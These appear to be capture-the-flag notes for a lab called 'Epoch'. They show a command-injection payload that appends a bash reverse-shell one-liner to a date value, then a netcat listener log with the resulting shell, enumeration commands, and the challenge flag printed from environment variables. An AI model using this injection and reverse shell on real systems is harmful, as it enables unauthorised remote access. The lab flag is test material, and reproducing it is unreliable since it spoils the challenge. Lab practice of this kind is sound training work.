# Epoch

15022022&&bash -i >& /dev/tcp/10.14.110.0/4578 0>&1

┌──(kali㉿kali)-[~]
└─$ nc -lvp 4578                                                           
listening on [any] 4578 ...
10.10.69.50: inverse host lookup failed: Unknown host
connect to [10.14.110.0] from (UNKNOWN) [10.10.69.50] 35150
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
challenge@e7c1352e71ec:~$ ls
ls
go.mod
go.sum
main
main.go
views
challenge@e7c1352e71ec:~$ cd /root
cd /root
bash: cd: /root: Permission denied
challenge@e7c1352e71ec:~$ sudo cd /root
sudo cd /root
bash: sudo: command not found
challenge@e7c1352e71ec:~$ whoami
whoami
challenge
challenge@e7c1352e71ec:~$ ls -la
ls -la
total 13772
drwxr-xr-x 1 root root     4096 Mar  2  2022 .
drwxr-xr-x 1 root root     4096 Mar  2  2022 ..
-rw-r--r-- 1 root root      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 root root     3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 root root      807 Feb 25  2020 .profile
-rw-rw-r-- 1 root root      236 Mar  2  2022 go.mod
-rw-rw-r-- 1 root root    52843 Mar  2  2022 go.sum
-rwxr-xr-x 1 root root 14014363 Mar  2  2022 main
-rw-rw-r-- 1 root root     1164 Mar  2  2022 main.go
drwxrwxr-x 1 root root     4096 Mar  2  2022 views
challenge@e7c1352e71ec:~$ cd ..
cd ..
challenge@e7c1352e71ec:/home$ ls
ls
challenge
challenge@e7c1352e71ec:/home$ cd ..
cd ..
challenge@e7c1352e71ec:/$ ls
ls
bin
boot
dev
etc
go1.15.7.linux-amd64.tar.gz
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
challenge@e7c1352e71ec:/$ cd dev
cd dev
challenge@e7c1352e71ec:/dev$ ls
ls
core
fd
full
mqueue
null
ptmx
pts
random
shm
stderr
stdin
stdout
tty
urandom
zero
challenge@e7c1352e71ec:/dev$ id
id
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
challenge@e7c1352e71ec:/dev$ printenv
printenv
HOSTNAME=e7c1352e71ec
PWD=/dev
HOME=/home/challenge
LS_COLORS=
GOLANG_VERSION=1.15.7
FLAG=flag{7da6c7debd40bd611560c13d8149b647}
SHLVL=2
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/printenv
OLDPWD=/
challenge@e7c1352e71ec:/dev$ 
